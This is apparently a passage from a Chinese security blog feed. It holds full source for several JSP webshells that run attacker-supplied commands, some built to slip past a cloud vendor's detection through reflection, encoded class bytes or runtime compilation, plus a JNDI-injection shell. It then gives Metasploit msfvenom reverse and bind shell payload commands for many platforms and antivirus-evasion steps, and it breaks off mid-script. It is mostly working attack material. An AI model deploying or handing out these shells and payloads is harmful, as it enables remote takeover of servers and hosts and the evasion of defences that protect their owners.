response.getOutputStream().write(new ClassLoader() {        @Override        public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException {            if (name.contains(&quot;Threedr3am_2&quot;)) {                return findClass(name);            }            return super.loadClass(name);        }        @Override        protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {            try {                byte[] bytes = Base64.getDecoder().decode(&quot;yv66vgAAADQAiAoAGgA+BwA/CgACAD4HAEAHAEEKAEIAQwoAQgBECgBFAEYKAAUARwoABABICgAEAEkKAAIASggASwoAAgBMCQAQAE0HAE4KAE8AUAgAUQoAUgBTCgBUAFUKAFQAVgoAVwBYCgBZAFoJAFsAXAoAXQBeBwBfAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA5MVGhyZWVkcjNhbV8yOwEAA2NtZAEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcATgcAYAcAPwcAQAEACkV4Y2VwdGlvbnMHAGEBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAC2lucHV0U3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAFYnl0ZXMBAAJbQgEABGNvZGUBAApTb3VyY2VGaWxlAQARVGhyZWVkcjNhbV8yLmphdmEMAB0AYgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAGMMAGQAZQwAZgBnBwBoDABpAGoMAB0AawwAHQBsDABtADIMAG4AbwEAAQoMADEAMgwAGwAcAQAMVGhyZWVkcjNhbV8yBwBwDABxAHIBABJUaHJlZWRyM2FtXzIuY2xhc3MHAHMMAHQAdQcAdgwAdwB4DAB5AHoHAHsMAHwAfwcAgAwAgQCCBwCDDACEAIUHAIYMAIcAHgEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA9qYXZhL2xhbmcvQ2xhc3MBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABNnZXRSZXNvdXJjZUFzU3RyZWFtAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9pby9JbnB1dFN0cmVhbTsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEABShbQilJAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgAhABAAGgAAAAEAAAAbABwAAAADAAEAHQAeAAIAHwAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAgAAAAHgAHAAAADgAEAA8ADAAQACUAEgAvABMAPgAVAEYAFgAhAAAANAAFAAAARwAiACMAAAAAAEcAJAAcAAEADAA7ACUAJgACACUAIgAnACgAAwAsABsAKQAcAAQAKgAAABsAAv8AJQAEBwArBwAsBwAtBwAuAAD8ABgHACwALwAAAAQAAQAwAAEAMQAyAAEAHwAAAC8AAQABAAAABSq0AA+wAAAAAgAgAAAABgABAAAAGgAhAAAADAABAAAABQAiACMAAAAJADMANAACAB8AAACEAAIABAAAACgSELYAERIStgATTCu2ABS8CE0rLLYAFVe4ABYstgAXTrIAGC22ABmxAAAAAgAgAAAAGgAGAAAAHgALAB8AEgAgABgAIQAgACIAJwAjACEAAAAqAAQAAAAoADUANgAAAAsAHQA3ADgAAQASABYAOQA6AAIAIAAIADsAHAADAC8AAAAEAAEAMAACADwAAAACAD0AfgAAAAoAAQBZAFcAfQAJ&quot;);                PermissionCollection pc = new Permissions();                pc.add(new AllPermission());                ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), pc, this, null);                return this.defineClass(name, bytes, 0, bytes.length, protectionDomain);            } catch (Exception e) {                e.printStackTrace();            }            return super.findClass(name);        }    }.loadClass(&quot;Threedr3am_2&quot;).getConstructor(String.class).newInstance(request.getParameter(&quot;cmd&quot;)).toString().getBytes());%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>使用ScriptEngine.eval的JSP Webshell</strong></p><pre><code>&lt;!--linux--&gt;&lt;%@ page import=&quot;javax.script.ScriptEngineManager&quot; %&gt;&lt;%@ page import=&quot;java.util.Base64&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;ScriptEngine.eval的JSP Webshell&lt;/h2&gt;&lt;%    String s1 = &quot;s=[3];s[0]=&#39;/bin/bash&#39;;s[1]=&#39;-c&#39;;s[2]=&#39;&quot;;    String s2 = request.getParameter(&quot;cmd&quot;);    String s3 = new String(Base64.getDecoder().decode(&quot;JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs=&quot;));    Process process = (Process) new ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(s1 + s2 + s3);    InputStream inputStream = process.getInputStream();    StringBuilder stringBuilder = new StringBuilder();    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));    String line;    while((line = bufferedReader.readLine()) != null) {        stringBuilder.append(line).append(&quot;\n&quot;);    }    if (stringBuilder.length() &gt; 0) {        response.getOutputStream().write(stringBuilder.toString().getBytes());    }%&gt;&lt;/body&gt;&lt;/html&gt;&lt;!--windows--&gt;&lt;%@ page import=&quot;javax.script.ScriptEngineManager&quot; %&gt;&lt;%@ page import=&quot;java.util.Base64&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;ScriptEngine.eval的JSP Webshell&lt;/h2&gt;&lt;%    String s1 = &quot;s=[3];s[0]=&#39;cmd.exe&#39;;s[1]=&#39;/c&#39;;s[2]=&#39;&quot;;    String s2 = request.getParameter(&quot;cmd&quot;);    String s3 = new String(Base64.getDecoder().decode(&quot;JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs=&quot;));    Process process = (Process) new ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(s1 + s2 + s3);    InputStream inputStream = process.getInputStream();    StringBuilder stringBuilder = new StringBuilder();    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));    String line;    while((line = bufferedReader.readLine()) != null) {        stringBuilder.append(line).append(&quot;\n&quot;);    }    if (stringBuilder.length() &gt; 0) {        response.getOutputStream().write(stringBuilder.toString().getBytes());    }%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>使用javac动态编译class的JSP Webshell</strong></p><pre><code>&lt;%@ page import=&quot;java.net.URL&quot; %&gt;&lt;%@ page import=&quot;java.net.URLClassLoader&quot; %&gt;&lt;%@ page import=&quot;java.nio.charset.Charset&quot; %&gt;&lt;%@ page import=&quot;java.nio.file.Files&quot; %&gt;&lt;%@ page import=&quot;java.nio.file.Paths&quot; %&gt;&lt;%@ page import=&quot;java.util.Locale&quot; %&gt;&lt;%@ page import=&quot;javax.tools.DiagnosticCollector&quot; %&gt;&lt;%@ page import=&quot;javax.tools.JavaCompiler&quot; %&gt;&lt;%@ page import=&quot;javax.tools.JavaFileObject&quot; %&gt;&lt;%@ page import=&quot;javax.tools.StandardJavaFileManager&quot; %&gt;&lt;%@ page import=&quot;javax.tools.ToolProvider&quot; %&gt;&lt;%@ page import=&quot;java.util.Random&quot; %&gt;&lt;%@ page import=&quot;java.io.File&quot; %&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;javac动态编译class的JSP Webshell&lt;/h2&gt;&lt;%    String c = request.getParameter(&quot;cmd&quot;);    String tmpPath = Files.createTempDirectory(&quot;threedr3am&quot;).toFile().getPath();    JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();    DiagnosticCollector&lt;JavaFileObject&gt; diagnostics = new DiagnosticCollector();    StandardJavaFileManager standardJavaFileManager = javaCompiler            .getStandardFileManager(diagnostics, Locale.CHINA, Charset.forName(&quot;utf-8&quot;));    int id = new Random().nextInt(10000000);    StringBuilder stringBuilder = new StringBuilder()            .append(&quot;import java.io.BufferedReader;\n&quot;)            .append(&quot;import java.io.IOException;\n&quot;)            .append(&quot;import java.io.InputStream;\n&quot;)            .append(&quot;import java.io.InputStreamReader;\n&quot;)            .append(&quot;public class Threedr3am&quot; + id + &quot; {\n&quot;)            .append(&quot;   public static String result = \&quot;\&quot;;\n&quot;)            .append(&quot;   public Threedr3am&quot; + id + &quot;() throws Throwable  {\n&quot;)            .append(&quot;        StringBuilder stringBuilder = new StringBuilder();\n&quot;)            .append(&quot;        try {&quot;)            .append(&quot;               BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\&quot;&quot; + c + &quot;\&quot;).getInputStream()));\n&quot;)            .append(&quot;               String line;\n&quot;)            .append(&quot;               while((line = bufferedReader.readLine()) != null) {\n&quot;)            .append(&quot;                       stringBuilder.append(line).append(\&quot;\\n\&quot;);\n&quot;)            .append(&quot;               }\n&quot;)            .append(&quot;               result = stringBuilder.toString();\n&quot;)            .append(&quot;        } catch (Exception e) {\n&quot;)            .append(&quot;              e.printStackTrace();\n&quot;)            .append(&quot;        }\n&quot;)            .append(&quot;        throw new Throwable(stringBuilder.toString());&quot;)            .append(&quot;   }\n&quot;)            .append(&quot;}&quot;);    Files.write(Paths.get(tmpPath + File.separator + &quot;Threedr3am&quot; +id + &quot;.java&quot;), stringBuilder.toString().getBytes());    Iterable fileObject = standardJavaFileManager.getJavaFileObjects(tmpPath + File.separator + &quot;Threedr3am&quot; +id + &quot;.java&quot;);    javaCompiler.getTask(null, standardJavaFileManager, diagnostics, null, null, fileObject).call();    try {        new URLClassLoader(new URL[]{new URL(&quot;file:&quot; + tmpPath + File.separator)}).loadClass(&quot;Threedr3am&quot; + id).newInstance();    } catch (Throwable e) {        response.getOutputStream().write(e.getMessage().getBytes());    }%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>使用了jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP Webshell</strong></p><pre><code>&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;&lt;%@ page import=&quot;java.security.CodeSource&quot; %&gt;&lt;%@ page import=&quot;java.security.cert.Certificate&quot; %&gt;&lt;%@ page import=&quot;java.util.Base64&quot; %&gt;&lt;%@ page import=&quot;jdk.nashorn.internal.runtime.Context&quot; %&gt;&lt;%@ page import=&quot;jdk.nashorn.internal.runtime.options.Options&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;&lt;%@ page import=&quot;sun.reflect.misc.MethodUtil&quot; %&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP Webshell&lt;/h2&gt;&lt;%    Class c = Class.forName(&quot;jdk.nashorn.internal.runtime.ScriptLoader&quot;);    final Constructor constructor = c.getDeclaredConstructor(Context.class);    constructor.setAccessible(true);    final Method m = c.getDeclaredMethod(&quot;installClass&quot;, String.class, byte[].class, CodeSource.class);    m.setAccessible(true);    class A {        B b;        final class B {            private Object o;            private Object[] oo;            public B() throws IllegalAccessException, InvocationTargetException, InstantiationException {                o = constructor.newInstance(new Context(new Options(&quot;&quot;), null, null));                oo = new Object[]{&quot;Threedr3am_6&quot;, Base64.getDecoder().decode(&quot;yv66vgAAADQAiAoAGgA+BwA/CgACAD4HAEAHAEEKAEIAQwoAQgBECgBFAEYKAAUARwoABABICgAEAEkKAAIASggASwoAAgBMCQAQAE0HAE4KAE8AUAgAUQoAUgBTCgBUAFUKAFQAVgoAVwBYCgBZAFoJAFsAXAoAXQBeBwBfAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA5MVGhyZWVkcjNhbV82OwEAA2NtZAEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcATgcAYAcAPwcAQAEACkV4Y2VwdGlvbnMHAGEBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAC2lucHV0U3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAFYnl0ZXMBAAJbQgEABGNvZGUBAApTb3VyY2VGaWxlAQARVGhyZWVkcjNhbV82LmphdmEMAB0AYgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAGMMAGQAZQwAZgBnBwBoDABpAGoMAB0AawwAHQBsDABtADIMAG4AbwEAAQoMADEAMgwAGwAcAQAMVGhyZWVkcjNhbV82BwBwDABxAHIBABJUaHJlZWRyM2FtXzYuY2xhc3MHAHMMAHQAdQcAdgwAdwB4DAB5AHoHAHsMAHwAfwcAgAwAgQCCBwCDDACEAIUHAIYMAIcAHgEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA9qYXZhL2xhbmcvQ2xhc3MBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABNnZXRSZXNvdXJjZUFzU3RyZWFtAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9pby9JbnB1dFN0cmVhbTsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEABShbQilJAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgAhABAAGgAAAAEAAAAbABwAAAADAAEAHQAeAAIAHwAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAgAAAAHgAHAAAADgAEAA8ADAAQACUAEgAvABMAPgAVAEYAFgAhAAAANAAFAAAARwAiACMAAAAAAEcAJAAcAAEADAA7ACUAJgACACUAIgAnACgAAwAsABsAKQAcAAQAKgAAABsAAv8AJQAEBwArBwAsBwAtBwAuAAD8ABgHACwALwAAAAQAAQAwAAEAMQAyAAEAHwAAAC8AAQABAAAABSq0AA+wAAAAAgAgAAAABgABAAAAGgAhAAAADAABAAAABQAiACMAAAAJADMANAACAB8AAACEAAIABAAAACgSELYAERIStgATTCu2ABS8CE0rLLYAFVe4ABYstgAXTrIAGC22ABmxAAAAAgAgAAAAGgAGAAAAHgALAB8AEgAgABgAIQAgACIAJwAjACEAAAAqAAQAAAAoADUANgAAAAsAHQA3ADgAAQASABYAOQA6AAIAIAAIADsAHAADAC8AAAAEAAEAMAACADwAAAACAD0AfgAAAAoAAQBZAFcAfQAJ&quot;), new CodeSource(null, (Certificate[]) null)};            }        }        public A() throws IllegalAccessException, InstantiationException, InvocationTargetException {            b = new B();        }        public Class invokex(Method method)                throws InvocationTargetException, IllegalAccessException {            return (Class) MethodUtil.invoke(method, b.o, b.oo);        }    }    Class target = new A().invokex(m);    response.getOutputStream().write(target.getConstructor(String.class).newInstance(request.getParameter(&quot;cmd&quot;)).toString().getBytes());%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>使用内部类绕某云检测java.lang.ProcessImpl以及invoke的一个JSP Webshell</strong></p><pre><code>&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.InvocationTargetException&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;&lt;%@ page import=&quot;java.util.Map&quot; %&gt;&lt;%@ page import=&quot;sun.reflect.misc.MethodUtil&quot; %&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;java.lang.ProcessImpl JSP Webshell&lt;/h2&gt;&lt;%    try {        final String s = request.getParameter(&quot;cmd&quot;);        class A {            B b;            final class B {                private Method o;                private Object oo;                private Object[] ooo;                public B() throws ClassNotFoundException, NoSuchMethodException {                    Class clz = Class.forName(&quot;java.lang.ProcessImpl&quot;);                    Method method = clz                            .getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class,                                    ProcessBuilder.Redirect[].class, boolean.class);                    method.setAccessible(true);                    o = method;                    oo = clz;                    ooo = new Object[]{s.split(&quot; &quot;), null, null, null, false};                }            }            public A() throws ClassNotFoundException, NoSuchMethodException {                b = new B();            }            public Object invokex()                    throws InvocationTargetException, IllegalAccessException {                return MethodUtil.invoke(b.o, b.oo, b.ooo);            }        }        Process process = (Process) new A().invokex();        InputStream inputStream = process.getInputStream();        StringBuilder stringBuilder = new StringBuilder();        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));        String line;        while ((line = bufferedReader.readLine()) != null) {            stringBuilder.append(line).append(&quot;\n&quot;);        }        if (stringBuilder.length() &gt; 0) {            response.getOutputStream().write(stringBuilder.toString().getBytes());        }    } catch (Exception e) {        e.printStackTrace();    }%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>利用MethodAccessor.invoke绕过检测Method.invoke的JSP Webshell</strong></p><pre><code>&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;&lt;%@ page import=&quot;java.util.Map&quot; %&gt;&lt;%@ page import=&quot;sun.reflect.ReflectionFactory&quot; %&gt;&lt;%@ page import=&quot;java.security.AccessController&quot; %&gt;&lt;%@ page import=&quot;sun.reflect.MethodAccessor&quot; %&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;MethodAccessor.invoke绕过检测Method.invoke的JSP Webshell&lt;/h2&gt;&lt;%!    public static class Threedr3am_9 {        public static final Class clz = Class.forName(&quot;java.lang.ProcessImpl&quot;);        public static Object[] ooo;    }%&gt;&lt;%    String s = request.getParameter(&quot;cmd&quot;);    Threedr3am_9.ooo = new Object[]{s.split(&quot; &quot;), null, null, null, false};    Method method = Threedr3am_9.clz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);    method.setAccessible(true);    ReflectionFactory reflectionFactory = AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());    MethodAccessor methodAccessor = reflectionFactory.newMethodAccessor(method);    Process process = (Process) methodAccessor.invoke(null, null);    InputStream inputStream = process.getInputStream();    StringBuilder stringBuilder = new StringBuilder();    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));    String line;    while ((line = bufferedReader.readLine()) != null) {        stringBuilder.append(line).append(&quot;\n&quot;);    }    if (stringBuilder.length() &gt; 0) {        response.getOutputStream().write(stringBuilder.toString().getBytes());    }%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>使用JdbcRowSetImpl进行jndi注入的JSP Webshell</strong></p><pre><code>&lt;%@ page import=&quot;com.sun.rowset.JdbcRowSetImpl&quot; %&gt;&lt;%    System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);    JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();    jdbcRowSet.setDataSourceName(request.getParameter(&quot;threedr3am&quot;));//ldap://localhost:43658/Calc    try {        jdbcRowSet.setAutoCommit(true);    } catch (Throwable e) {        response.getOutputStream().write(e.getCause().getMessage().getBytes());    }%&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MetasploitFramework</title>
      <link href="/MetasploitFramework/"/>
      <url>/MetasploitFramework/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-MSF"><a href="#0x00-MSF" class="headerlink" title="0x00 MSF"></a>0x00 MSF</h2><p>&ensp;&ensp;&ensp;&ensp;MSF：Metasploit Framework，一种集信息搜集、漏洞探测、漏洞利用、权限提升、内网渗透、权限维持、痕迹清除于一身，漏洞验证与利用的工具框架。</p><h2 id="0x10-msfvenom"><a href="#0x10-msfvenom" class="headerlink" title="0x10 msfvenom"></a>0x10 msfvenom</h2><ol><li>2015-6-8起，msfvenom是msfpayload和msfencode的组合。</li><li><a href="#msfvenom">msfvenom帮助信息</a></li></ol><p><strong>各版本反弹shell</strong></p><ol><li><strong>windows：</strong></li><li><ul><li><code>msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 7 -e x86/shikata_ga_nai lhost=[攻击机IP] lport=[攻击机端口] -f exe &gt;/tmp/test.exe</code></li></ul></li><li><strong>Linux：</strong></li><li><ul><li><code>msfvenom -p linux/meterpreter/reverse_tcp --platform linux -a x86 -e x86/shikata_ga_nai -i 13 lhost=[攻击机IP] lport=[攻击机端口] -f elf -o test.elf</code></li></ul></li><li><strong>Mac：</strong></li><li><ul><li><code>msfvenom -p osx/meterpreter/reverse_tcp --platform 0sx -a x86 lhost=[攻击机IP] lport=[攻击机端口] -f macho -o test.macho</code></li></ul></li><li><strong>Android：</strong></li><li><ul><li><code>msfvenom -p android/meterpreter/reverse_tcp lhost=[攻击机IP] lport=[攻击机端口] -o test.apk</code></li></ul></li><li><strong>Asp/Aspx：</strong></li><li><ul><li><code>msfvenom -p windows/meterpreter/reverse_tcp --platform windows lhost=[攻击机IP] lport=[攻击机端口] -f aspx -o test.aspx</code></li></ul></li><li><ul><li><code>msfvenom -p windows/meterpreter/reverse_tcp --platform windows lhost=[攻击机IP] lport=[攻击机端口] -f asp -o test.asp</code></li></ul></li><li><strong>JSP/WAR：</strong></li><li><ul><li><code>msfvenom -p java/jsp_shell_reverse_tcp lhost=[攻击机IP] lport=[攻击机端口] -f raw -o test.jsp</code></li></ul></li><li><ul><li><code>msfvenom -p java/jsp_shell_reverse_tcp lhost=[攻击机IP] lport=[攻击机端口] -f raw -o test.war</code></li></ul></li><li><strong>PHP：</strong></li><li><ul><li><code>msfvenom -p php/meterpreter/reverse_tcp lhost=[攻击机IP] lport=[攻击机端口] -f raw -o test.php</code></li></ul></li><li><strong>BASH：</strong></li><li><ul><li><code>msfvenom -p cmd/unix/reverse_bash lhost=[攻击机IP] lport=[攻击机端口]-f raw -o test.sh</code></li></ul></li><li><strong>Python：</strong></li><li><ul><li><code>msfvenom -p python/meterpreter/reverse_tcp lhost=[攻击机IP] lport=[攻击机端口] -f raw -o test.py</code></li></ul></li><li><strong>perl：</strong></li><li><ul><li><code>msfvenom -p cmd/unix/reverse_perl lhost=[攻击机IP] lport=[攻击机端口] -f raw -o test.pl</code></li></ul></li><li></li><li><strong>例子：</strong></li><li>攻击机192.168.100.4开启监听端口4444</li><li>use exploit/multi/handler</li><li>set payload windows/meterpreter/reverse_tcp</li><li>set lhost 192.168.100.4 #攻击机IP</li><li>set lport 4444 #攻击机port，一般默认4444</li><li>run</li><li>把test.exe上传到目的主机并执行，192.168.100.4就可以接收到反向连接的meterpreter</li><li>但是test.exe容易被目的主机的杀软隔离。</li><li><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="noopener">msfvenom相关教程</a></li></ol><p><strong>各版本直连shell</strong></p><ol><li><strong>windows：</strong></li><li><ul><li><code>msfvenom -p windows/shell/bind_tcp lport=[攻击机port，这里4444] -f exe &gt;/root/tmp/test.exe</code></li></ul></li><li><ul><li><code>msfvenom -p windows/shell_bind_tcp lport=[攻击机port，这里4444] -f exe &gt;/root/tmp/test.exe</code></li></ul></li><li><strong>Linux：</strong></li><li><ul><li><code>msfvenom -p linux/x64/shell/bind_tcp lport=[攻击机port，这里4444] -f elf &gt;/root/tmp/test.elf</code></li></ul></li><li><strong>例子：</strong></li><li>攻击机192.168.100.4开启监听端口4444</li><li>use exploit/multi/handler</li><li>set payload windows/shell/bind_tcp</li><li>set lport 4444 #攻击机port，一般默认4444</li><li>set rhost 192.168.100.3 #受害机IP</li><li>run</li><li>开启监听后，上传test.exe到受害机并执行即可获取受害机的shell</li><li><img src="/MetasploitFramework/21.png" alt></li></ol><h2 id="0x11-Msfvenom生成免杀"><a href="#0x11-Msfvenom生成免杀" class="headerlink" title="0x11 Msfvenom生成免杀"></a>0x11 Msfvenom生成免杀</h2><p><strong>静态免杀一</strong></p><ol><li><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b &#39;\x00&#39; lhost=192.168.100.4 lport=4444 -f exe &gt;/root/tmp/test.exe</code></li><li>-e：编码方式，-i：编码次数，-b：去除指定字符</li></ol><p><strong>静态免杀二</strong></p><ol><li><code>msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.100.4 lport=4444 -f raw &gt; /root/tmp/test.py</code></li><li><img src="/MetasploitFramework/11.png" alt></li><li><strong>windows环境：</strong></li><li>安装<strong>32位python2</strong>，安装<a href="https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download" target="_blank" rel="noopener">py2exe for python2.7</a></li><li><strong>准备脚本：</strong>setup.py、test.py</li></ol><p><strong>setup.py</strong></p><pre><code># encoding:utf-8from distutils.core import setupimport py2exesetup(name = &quot;test&quot;,description = &quot;Python-based App&quot;,version = &quot;1.0&quot;,console = [&quot;test.py&quot;],options = 